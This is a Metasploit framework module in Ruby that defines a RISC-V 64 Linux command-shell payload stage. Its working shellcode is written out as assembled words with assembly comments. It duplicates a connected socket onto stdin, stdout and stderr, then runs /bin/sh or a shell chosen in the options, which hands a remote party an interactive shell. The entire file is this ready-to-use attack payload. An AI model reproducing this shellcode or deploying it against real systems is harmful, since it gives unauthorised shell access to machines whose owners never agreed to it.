# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux dup2 Command Shell',
        'Description' => 'dup2 socket in s1, then execve',
        'Author' => ['bcoles'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_RISCV64LE,
        'Session' => Msf::Sessions::CommandShell,
        'Stage' => {
          'Payload' =>
                [
                  # dup3(s1, 0, 0) — stdin
                  0x00048513,          #  mv    a0, s1
                  0x00000593,          #  li    a1, 0
                  0x00000613,          #  li    a2, 0
                  0x01800893,          #  li    a7, 24            # SYS_dup3
                  0x00000073,          #  ecall

                  # dup3(s1, 1, 0) — stdout
                  0x00048513,          #  mv    a0, s1
                  0x00100593,          #  li    a1, 1
                  0x00000613,          #  li    a2, 0
                  0x01800893,          #  li    a7, 24
                  0x00000073,          #  ecall

                  # dup3(s1, 2, 0) — stderr
                  0x00048513,          #  mv    a0, s1
                  0x00200593,          #  li    a1, 2
                  0x00000613,          #  li    a2, 0
                  0x01800893,          #  li    a7, 24
                  0x00000073,          #  ecall

                  # execve(&shell, [&shell, NULL], NULL)
                  0x0dd00893,          #  li    a7, 221           # SYS_execve
                  0x00000297,          #  auipc t0, 0
                  0x03028293,          #  addi  t0, t0, 48        # t0 = &shell
                  0xff010113,          #  addi  sp, sp, -16
                  0x00513023,          #  sd    t0, 0(sp)         # argv[0] = &shell
                  0x00013423,          #  sd    zero, 8(sp)       # argv[1] = NULL
                  0x00028513,          #  mv    a0, t0            # path
                  0x00010593,          #  mv    a1, sp            # argv
                  0x00000613,          #  li    a2, 0             # envp
                  0x00000073,          #  ecall

                  # exit(0)
                  0x00000513,          #  li    a0, 0
                  0x05d00893,          #  li    a7, 93            # SYS_exit
                  0x00000073,          #  ecall

                  # shell path (16 bytes, patched by generate_stage)
                  0x6e69622f,          #  "/bin"
                  0x0068732f,          #  "/sh\0"
                  0x00000000,          #  padding
                  0x00000000,          #  padding
                ].pack('V*')
        }
      )
    )
    register_options([
      OptString.new('SHELL', [ true, 'The shell to execute.', '/bin/sh' ]),
    ])
  end

  def generate_stage(opts = {})
    p = super
    sh = datastore['SHELL']
    if sh.length >= 16
      raise ArgumentError, 'The specified shell must be less than 16 bytes.'
    end

    p[112, sh.length] = sh
    p
  end
end
